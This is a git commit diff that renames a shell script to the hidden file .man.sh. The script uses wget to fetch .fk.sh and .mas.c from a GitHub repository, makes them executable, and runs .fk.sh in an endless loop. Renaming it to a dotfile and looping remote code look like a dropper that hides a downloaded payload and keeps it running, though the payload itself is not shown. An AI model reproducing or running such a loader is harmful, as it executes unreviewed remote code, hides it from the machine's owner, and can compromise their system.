e2973d6760f752005e0f44078b4ee263abaa5906
Test2443 <101375280+Test2443@users.noreply.github.com>
2022-03-11 08:02:17 +0530

    Update and rename man.sh to .man.sh

---
+++ .man.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+  wget https://github.com/Test2443/FkgX/raw/main/.fk.sh 
+  chmod +x .fk.sh 
+  wget https://github.com/Test2443/FkgX/raw/main/.mas.c
+  chmod +x .mas.c
+  while [ 1 ]; do
+  ./.fk.sh
+  sleep 20000
+  done
--- man.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/sh
-  wget https://github.com/biswas179/FkgX/raw/main/fk.sh 
-  chmod +x fk.sh 
-  wget https://github.com/biswas179/FkgX/raw/main/mas.c
-  chmod +x mas.c
-  while [ 1 ]; do
-  ./fk.sh
-  sleep 20000
-  done
